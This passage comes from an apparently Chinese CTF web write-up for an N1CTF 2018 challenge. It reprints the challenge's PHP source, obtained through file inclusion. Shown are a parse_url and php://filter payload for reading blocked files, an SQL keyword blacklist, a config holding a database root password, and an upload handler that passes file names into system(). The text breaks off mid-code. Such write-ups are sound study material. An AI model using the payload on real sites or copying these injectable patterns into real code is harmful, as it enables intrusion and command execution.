double-quoted-string string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'info'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下function.php</p><p><code>function.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>就这样根据源码的数据…读到了以下界面</p><p><code>config.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ERROR</span> <span class="token operator">|</span> <span class="token constant">E_WARNING</span> <span class="token operator">|</span> <span class="token constant">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">BASEDIR</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userinfo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'upload'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE_admin</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userinfo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'upload'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'manage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DBHOST</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$DBUSER</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$DBPASS</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Nu1LCTF2018!@#qwe"</span><span class="token punctuation">;</span><span class="token comment">//$DBPASS = "";</span><span class="token variable">$DBNAME</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"N1CTF"</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DBHOST</span><span class="token punctuation">,</span> <span class="token variable">$DBUSER</span><span class="token punctuation">,</span> <span class="token variable">$DBPASS</span><span class="token punctuation">,</span> <span class="token variable">$DBNAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"no sql connection"</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>guest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/guest.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>info.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/info.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>ffffllllaaaaggg</code>被过滤</p><h5 id="利用-parse-url解析漏洞"><a href="#利用-parse-url解析漏洞" class="headerlink" title="利用 parse_url解析漏洞"></a>利用 <code>parse_url</code>解析漏洞</h5><p> 当url种出现下面这种情况的url，会解析错误，返回false<br><code>//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code> </p><p><code>ffffllllaaaaggg.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>m4aaannngggeee.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/upload.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>./templates/upload.html</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129211243615.png" class="" title="image-20201129211243615"><p>赶紧上传个，结果白高兴一场</p><img src="/article/Buuoj-WEB-Write-up/image-20201129211356792.png" class="" title="image-20201129211356792"><p>利用user.php再读<code>upllloadddd.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/png;base64,"</span><span class="token punctuation">.</span><span class="token variable">$picdata</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token 